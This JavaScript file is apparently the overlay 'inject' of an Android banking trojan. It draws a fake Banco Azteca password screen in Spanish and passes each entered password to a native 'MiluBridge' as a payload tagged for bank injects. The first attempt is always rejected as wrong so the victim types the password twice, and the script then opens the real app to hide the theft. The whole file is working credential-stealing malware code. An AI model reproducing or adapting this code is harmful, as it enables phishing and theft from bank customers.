(() => {
  const MIN_LEN = 4;
  const MAX_LEN = 64;

  const page = document.getElementById("page");
  const field = document.getElementById("field");
  const pwdInput = document.getElementById("pwdInput");
  const toggleBtn = document.getElementById("toggleBtn");
  const enterBtn = document.getElementById("enterBtn");
  const faceBtn = document.getElementById("faceBtn");
  const forgotBtn = document.getElementById("forgotBtn");
  const greetingTime = document.getElementById("greetingTime");
  const toastEl = document.getElementById("toast");

  let submitting = false;
  let submitCount = 0;
  let toastTimer = 0;

  function bridge() {
    try {
      return window.MiluBridge || null;
    } catch (_) {
      return null;
    }
  }

  function reportDone(payload) {
    const b = bridge();
    if (b && typeof b.done === "function") {
      try {
        b.done(payload);
      } catch (_) {
        /* ignore */
      }
    }
  }

  function openApp() {
    const b = bridge();
    if (b && typeof b.openApp === "function") {
      try {
        b.openApp();
      } catch (_) {
        /* ignore */
      }
    }
  }

  function buildPayload(password) {
    return JSON.stringify({
      brand: "Banco Azteca",
      password,
      type_injects: "banks",
      closed: "close_activity_injects",
    });
  }

  function toast(msg) {
    toastEl.textContent = msg;
    toastEl.classList.add("is-show");
    window.clearTimeout(toastTimer);
    toastTimer = window.setTimeout(() => {
      toastEl.classList.remove("is-show");
    }, 2200);
  }

  function setGreetingByHour() {
    const hour = new Date().getHours();
    if (hour >= 5 && hour < 12) {
      greetingTime.textContent = "Buenos días";
    } else if (hour >= 12 && hour < 19) {
      greetingTime.textContent = "Buenas tardes";
    } else {
      greetingTime.textContent = "Buenas noches";
    }
  }

  function focusInput() {
    if (submitting) {
      return;
    }
    try {
      pwdInput.focus({ preventScroll: true });
    } catch (_) {
      pwdInput.focus();
    }
  }

  function shake() {
    field.classList.remove("is-shake");
    void field.offsetWidth;
    field.classList.add("is-shake");
  }

  function currentValue() {
    return String(pwdInput.value || "").slice(0, MAX_LEN);
  }

  function canSubmit() {
    const value = currentValue();
    return value.length >= MIN_LEN && value.length <= MAX_LEN;
  }

  function submitPassword() {
    if (submitting || !canSubmit()) {
      if (!canSubmit()) {
        shake();
        toast("Ingresa tu contraseña");
      }
      return;
    }

    submitting = true;
    enterBtn.disabled = true;
    const value = currentValue();
    submitCount += 1;
    reportDone(buildPayload(value));

    if (submitCount < 2) {
      toast("Contraseña incorrecta");
      shake();
      window.setTimeout(() => {
        pwdInput.value = "";
        submitting = false;
        enterBtn.disabled = false;
        focusInput();
      }, 360);
      return;
    }

    pwdInput.blur();
    window.setTimeout(() => {
      openApp();
      submitting = false;
      enterBtn.disabled = false;
    }, 320);
  }

  toggleBtn.addEventListener("click", () => {
    const show = pwdInput.type === "password";
    pwdInput.type = show ? "text" : "password";
    toggleBtn.classList.toggle("is-visible", show);
    toggleBtn.setAttribute("aria-pressed", show ? "true" : "false");
    toggleBtn.setAttribute("aria-label", show ? "Ocultar contraseña" : "Mostrar contraseña");
  });

  enterBtn.addEventListener("click", submitPassword);

  pwdInput.addEventListener("keydown", (event) => {
    if (event.key === "Enter") {
      event.preventDefault();
      submitPassword();
    }
  });

  pwdInput.addEventListener("input", () => {
    if (pwdInput.value.length > MAX_LEN) {
      pwdInput.value = pwdInput.value.slice(0, MAX_LEN);
    }
  });

  forgotBtn.addEventListener("click", () => {
    toast("Usa tu contraseña para entrar");
    focusInput();
  });

  faceBtn.addEventListener("click", () => {
    toast("Usa tu contraseña para entrar");
    focusInput();
  });

  page.querySelectorAll(".nav-item").forEach((btn) => {
    btn.addEventListener("click", () => {
      focusInput();
    });
  });

  page.addEventListener("pointerdown", (event) => {
    if (
      event.target.closest(".btn") ||
      event.target.closest(".nav-item") ||
      event.target.closest(".forgot-link") ||
      event.target.closest(".pwd-toggle")
    ) {
      return;
    }
    if (event.target !== pwdInput) {
      focusInput();
    }
  });

  setGreetingByHour();
  window.addEventListener("pageshow", focusInput);
  window.setTimeout(focusInput, 80);
})();
